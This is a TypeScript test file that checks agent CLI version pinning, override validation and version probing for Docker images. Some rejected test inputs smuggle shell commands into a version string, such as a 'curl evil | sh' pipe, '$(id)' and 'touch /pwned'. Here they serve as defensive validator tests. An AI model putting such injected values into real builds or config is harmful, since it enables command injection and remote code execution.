import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import * as logger from '../../src/logger.js';
import {
  AGENT_CLI_OVERRIDE_KEYS,
  assessAgentCliVersion,
  checkAgentCliVersion,
  CLAUDE_CODE_CLI_VERSION,
  CODEX_CLI_VERSION,
  compareAgentCliVersions,
  describeAgentCliVersionSelection,
  GOOSE_CLI_VERSION,
  isValidAgentCliVersionOverride,
  parseAgentCliVersion,
  resetAgentCliVersionChecksForTests,
  resolveAgentCliBuildArgs,
  type AgentCliVersionSupport,
} from '../../src/docker/agent-cli-version.js';
import { createClaudeCodeAdapter } from '../../src/docker/adapters/claude-code.js';
import { CODEX_CLIENT_VERSION, createCodexAdapter } from '../../src/docker/adapters/codex.js';
import { createGooseAdapter } from '../../src/docker/adapters/goose.js';
import type { ContainerRuntime } from '../../src/docker/types.js';

const dockerfile = (agent: string): string => readFileSync(resolve('docker', `Dockerfile.${agent}`), 'utf8');

describe('agent CLI pins in the Dockerfiles', () => {
  it.each([
    [
      'claude-code',
      CLAUDE_CODE_CLI_VERSION,
      /^RUN npm install -g "@anthropic-ai\/claude-code@\$\{CLAUDE_CODE_VERSION\}"$/mu,
    ],
    ['codex', CODEX_CLI_VERSION, /^RUN npm install -g "@openai\/codex@\$\{CODEX_VERSION\}"$/mu],
    ['goose', GOOSE_CLI_VERSION, /releases\/download\/v\$\{GOOSE_VERSION\}\//u],
  ] as const)('%s installs exactly the version its ARG pins', (agent, support, install) => {
    const text = dockerfile(agent);
    // The ARG default is the pin the adapter declares (and the qualified range holds it).
    expect(text).toMatch(new RegExp(`^ARG ${support.buildArg}=${support.pinned.replaceAll('.', '\\.')}$`, 'mu'));
    expect(text).toMatch(install);
    expect(compareAgentCliVersions(support.pinned, support.minVersion)).toBeGreaterThanOrEqual(0);
    expect(compareAgentCliVersions(support.pinned, support.maxTested)).toBeLessThanOrEqual(0);
    // No install of an unpinned (latest) CLI is left.
    expect(text).not.toMatch(/npm install -g @anthropic-ai\/claude-code\s*$|npm install -g @openai\/codex\s*$/mu);
  });

  it.each(['claude-code', 'codex', 'goose'])('%s is built FROM the exact base build IronCurtain passes', (agent) => {
    const text = dockerfile(agent);
    expect(text).toMatch(/^ARG IRONCURTAIN_BASE_IMAGE=ironcurtain-base:latest$/mu);
    expect(text).toMatch(/^FROM \$\{IRONCURTAIN_BASE_IMAGE\}$/mu);
    expect(text).not.toMatch(/^FROM ironcurtain-base:latest$/mu);
  });

  it('declares the version probe and qualified range on every adapter', () => {
    expect(createClaudeCodeAdapter()).toMatchObject({
      versionProbe: ['claude', '--version'],
      cliVersion: CLAUDE_CODE_CLI_VERSION,
    });
    expect(createCodexAdapter()).toMatchObject({ versionProbe: ['codex', '--version'], cliVersion: CODEX_CLI_VERSION });
    expect(createGooseAdapter()).toMatchObject({ versionProbe: ['goose', '--version'], cliVersion: GOOSE_CLI_VERSION });
    // The Codex provider binding's version header follows the pin.
    expect(CODEX_CLIENT_VERSION).toBe(CODEX_CLI_VERSION.pinned);
  });

  it('allows a config override for exactly the npm-installed CLIs', () => {
    expect(AGENT_CLI_OVERRIDE_KEYS).toEqual(['claude-code', 'codex']);
    expect(CLAUDE_CODE_CLI_VERSION.overrideKey).toBe('claude-code');
    expect(CODEX_CLI_VERSION.overrideKey).toBe('codex');
    expect(GOOSE_CLI_VERSION.overrideKey).toBeUndefined();
  });
});

describe('agent CLI version overrides', () => {
  it('accepts latest and exact versions only', () => {
    for (const value of ['latest', '2.1.292', '0.157.1', '1.0.0-beta.2', '10.20.30-rc1']) {
      expect(isValidAgentCliVersionOverride(value), value).toBe(true);
    }
    for (const value of [
      '',
      'Latest',
      'next',
      '2.1',
      '^2.1.0',
      '~2.1.0',
      '>=2.1.0',
      '2.1.x',
      'v2.1.292',
      '2.1.292 ',
      '2.1.292"; curl evil | sh; "',
      '2.1.292\nRUN id',
      '$(id)',
    ]) {
      expect(isValidAgentCliVersionOverride(value), JSON.stringify(value)).toBe(false);
    }
  });

  it('turns an override into the build arg and the pin into none', () => {
    expect(resolveAgentCliBuildArgs(CLAUDE_CODE_CLI_VERSION, { 'claude-code': 'latest' })).toEqual({
      CLAUDE_CODE_VERSION: 'latest',
    });
    expect(resolveAgentCliBuildArgs(CODEX_CLI_VERSION, { codex: '0.160.1', 'claude-code': 'latest' })).toEqual({
      CODEX_VERSION: '0.160.1',
    });
    // An override equal to the pin is the pin: the default build and hash.
    expect(
      resolveAgentCliBuildArgs(CLAUDE_CODE_CLI_VERSION, { 'claude-code': CLAUDE_CODE_CLI_VERSION.pinned }),
    ).toEqual({});
    expect(resolveAgentCliBuildArgs(CLAUDE_CODE_CLI_VERSION, {})).toEqual({});
    expect(resolveAgentCliBuildArgs(CLAUDE_CODE_CLI_VERSION, undefined)).toEqual({});
    expect(resolveAgentCliBuildArgs(GOOSE_CLI_VERSION, { 'claude-code': 'latest' })).toEqual({});
    expect(resolveAgentCliBuildArgs(undefined, { 'claude-code': 'latest' })).toEqual({});
  });

  it('refuses an invalid override that bypassed config validation', () => {
    expect(() =>
      resolveAgentCliBuildArgs(CLAUDE_CODE_CLI_VERSION, { 'claude-code': '1.0.0"; touch /pwned; "' }),
    ).toThrow(/agentCliVersions\.claude-code must be "latest" or an exact version/u);
  });

  it('reports which version an image installs', () => {
    expect(describeAgentCliVersionSelection(CLAUDE_CODE_CLI_VERSION, undefined)).toEqual({
      version: CLAUDE_CODE_CLI_VERSION.pinned,
      overridden: false,
    });
    expect(describeAgentCliVersionSelection(CODEX_CLI_VERSION, { codex: 'latest' })).toEqual({
      version: 'latest',
      overridden: true,
    });
  });
});

describe('agent CLI version parsing', () => {
  it('reads the version from each CLI --version format', () => {
    expect(parseAgentCliVersion('2.1.292 (Claude Code)\n')).toBe('2.1.292');
    expect(parseAgentCliVersion('codex-cli 0.157.1')).toBe('0.157.1');
    expect(parseAgentCliVersion(' 1.26.1\n')).toBe('1.26.1');
    expect(parseAgentCliVersion('tool 1.0.0-beta.2 (build 7)')).toBe('1.0.0-beta.2');
    expect(parseAgentCliVersion('no version here')).toBeUndefined();
  });

  it('orders releases numerically and a prerelease before its release', () => {
    expect(compareAgentCliVersions('2.1.292', '2.1.292')).toBe(0);
    expect(compareAgentCliVersions('2.1.300', '2.1.292')).toBe(1);
    expect(compareAgentCliVersions('2.10.0', '2.9.9')).toBe(1);
    expect(compareAgentCliVersions('1.9.9', '2.0.0')).toBe(-1);
    expect(compareAgentCliVersions('2.1.292-beta.1', '2.1.292')).toBe(-1);
    expect(compareAgentCliVersions('2.1.292', '2.1.292-beta.1')).toBe(1);
    expect(() => compareAgentCliVersions('x', '1.0.0')).toThrow(/not a version/u);
  });

  it('places a probed version relative to the qualified range', () => {
    const support: AgentCliVersionSupport = { ...CLAUDE_CODE_CLI_VERSION, minVersion: '2.1.200', maxTested: '2.1.292' };
    expect(assessAgentCliVersion('2.1.250 (Claude Code)', support)).toEqual({ kind: 'qualified', version: '2.1.250' });
    expect(assessAgentCliVersion('2.1.199 (Claude Code)', support)).toEqual({ kind: 'older', version: '2.1.199' });
    expect(assessAgentCliVersion('2.1.300 (Claude Code)', support)).toEqual({ kind: 'newer', version: '2.1.300' });
    expect(assessAgentCliVersion('\u001b[31mboom\u001b[0m', support)).toMatchObject({ kind: 'unparsed' });
    const unparsed = assessAgentCliVersion('\u001b[31mboom\u001b[0m', support);
    expect(unparsed.kind === 'unparsed' && unparsed.output).not.toContain('\u001b');
  });
});

describe('checkAgentCliVersion (session-start probe)', () => {
  const IMAGE = 'ironcurtain-claude-code:build-0123456789abcdef';
  let warn: ReturnType<typeof vi.spyOn>;
  let info: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    resetAgentCliVersionChecksForTests();
    warn = vi.spyOn(logger, 'warn').mockImplementation(() => {});
    info = vi.spyOn(logger, 'info').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
    resetAgentCliVersionChecksForTests();
  });

  function runtimeReporting(output: string | undefined): Pick<ContainerRuntime, 'probeImageVersion'> & {
    probeImageVersion: ReturnType<typeof vi.fn>;
  } {
    return { probeImageVersion: vi.fn(async () => output) };
  }

  it('warns when the image carries a CLI newer than the qualified range', async () => {
    const runtime = runtimeReporting('2.1.400 (Claude Code)');
    const verdict = await checkAgentCliVersion({
      runtime,
      image: IMAGE,
      buildHash: 'a'.repeat(64),
      versionProbe: ['claude', '--version'],
      support: CLAUDE_CODE_CLI_VERSION,
    });

    expect(verdict).toEqual({ kind: 'newer', version: '2.1.400' });
    expect(runtime.probeImageVersion).toHaveBeenCalledWith(IMAGE, ['claude', '--version']);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(String(warn.mock.calls[0][0])).toMatch(/Claude Code CLI 2\.1\.400 is newer than the versions qualified/u);
    expect(String(warn.mock.calls[0][0])).toContain('agentCliVersions.claude-code');
  });

  it('warns when the image carries a CLI older than the qualified range', async () => {
    const runtime = runtimeReporting('codex-cli 0.150.0');
    const verdict = await checkAgentCliVersion({
      runtime,
      image: 'ironcurtain-codex:build-0123456789abcdef',
      buildHash: 'b'.repeat(64),
      versionProbe: ['codex', '--version'],
      support: CODEX_CLI_VERSION,
    });

    expect(verdict).toEqual({ kind: 'older', version: '0.150.0' });
    expect(warn).toHaveBeenCalledTimes(1);
    expect(String(warn.mock.calls[0][0])).toMatch(/Codex CLI 0\.150\.0 is older than the versions qualified/u);
  });

  it('logs a qualified version without a warning', async () => {
    const runtime = runtimeReporting(`${CLAUDE_CODE_CLI_VERSION.pinned} (Claude Code)`);
    const verdict = await checkAgentCliVersion({
      runtime,
      image: IMAGE,
      buildHash: 'c'.repeat(64),
      versionProbe: ['claude', '--version'],
      support: CLAUDE_CODE_CLI_VERSION,
    });

    expect(verdict).toEqual({ kind: 'qualified', version: CLAUDE_CODE_CLI_VERSION.pinned });
    expect(warn).not.toHaveBeenCalled();
    expect(info).toHaveBeenCalledWith(expect.stringContaining(`Claude Code CLI ${CLAUDE_CODE_CLI_VERSION.pinned}`));
  });

  it('probes each image build once per process, and a rebuilt image again', async () => {
    const runtime = runtimeReporting('2.1.400 (Claude Code)');
    const input = {
      runtime,
      image: IMAGE,
      buildHash: 'd'.repeat(64),
      versionProbe: ['claude', '--version'],
      support: CLAUDE_CODE_CLI_VERSION,
    };
    await checkAgentCliVersion(input);
    await checkAgentCliVersion(input);
    expect(runtime.probeImageVersion).toHaveBeenCalledTimes(1);

    await checkAgentCliVersion({ ...input, buildHash: 'e'.repeat(64) });
    expect(runtime.probeImageVersion).toHaveBeenCalledTimes(2);
  });

  it('never throws and stays quiet when the probe fails or is unavailable', async () => {
    const failing = { probeImageVersion: vi.fn(async () => Promise.reject(new Error('docker gone'))) };
    await expect(
      checkAgentCliVersion({
        runtime: failing,
        image: IMAGE,
        buildHash: 'f'.repeat(64),
        versionProbe: ['claude', '--version'],
        support: CLAUDE_CODE_CLI_VERSION,
      }),
    ).resolves.toBeUndefined();
    await expect(
      checkAgentCliVersion({
        runtime: {},
        image: IMAGE,
        buildHash: '1'.repeat(64),
        versionProbe: ['claude', '--version'],
        support: CLAUDE_CODE_CLI_VERSION,
      }),
    ).resolves.toBeUndefined();
    await expect(
      checkAgentCliVersion({
        runtime: runtimeReporting('2.1.400'),
        image: IMAGE,
        buildHash: '2'.repeat(64),
        versionProbe: undefined,
        support: CLAUDE_CODE_CLI_VERSION,
      }),
    ).resolves.toBeUndefined();
    expect(warn).not.toHaveBeenCalled();
  });
});
